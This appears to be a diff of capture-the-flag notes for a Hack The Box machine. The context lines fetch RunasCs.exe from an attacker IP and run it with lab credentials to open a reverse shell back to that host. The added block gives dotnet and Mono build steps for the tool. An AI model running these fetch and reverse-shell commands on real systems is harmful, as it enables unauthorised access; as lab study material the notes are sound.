@@ -76,4 +76,18 @@ iwr 10.10.14.82:8000/RunasCs.exe -outfile runascs.exe
 #execute exe
 .\runascs.exe mikasaAckerman IL0v3ErenY3ager cmd -r 10.10.14.82:10002 -d freelancer.htb
 
+/* 
+//dot net option 
+sudo apt update
+sudo apt install dotnet-sdk-6.0
+sudo dnf install dotnet-sdk-6.0
 
+dotnet build RunasCs.csproj -o output
+//other scenario copy: scp output/RunasCs.exe user@windows-machine:/path/to/destination
+
+//Mono option
+sudo apt install mono-complete
+
+mcs -out:RunasCs.exe RunasCs.cs
+
+*/
